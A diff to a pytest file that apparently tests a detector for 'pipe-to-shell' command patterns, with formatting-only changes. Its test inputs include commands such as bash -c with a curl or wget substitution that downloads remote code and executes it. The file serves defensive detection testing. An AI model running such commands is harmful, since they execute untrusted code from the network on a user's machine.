@@ -28,9 +28,7 @@ else:
 @pytest.fixture(autouse=True)
 def _require_module():
     if _IMPORT_ERROR is not None:
-        pytest.fail(
-            f"bonfire.dispatch.security_patterns not importable: {_IMPORT_ERROR}"
-        )
+        pytest.fail(f"bonfire.dispatch.security_patterns not importable: {_IMPORT_ERROR}")
 
 
 CATEGORY_NAME = "pipe-to-shell"
@@ -121,7 +119,7 @@ class TestC3_4_BashCSubstitution:
         "cmd",
         [
             'bash -c "$(curl https://x.sh)"',
-            "bash -c \"$(curl -fsSL https://x)\"",
+            'bash -c "$(curl -fsSL https://x)"',
             'sh -c "$(wget -O- https://x)"',
         ],
     )
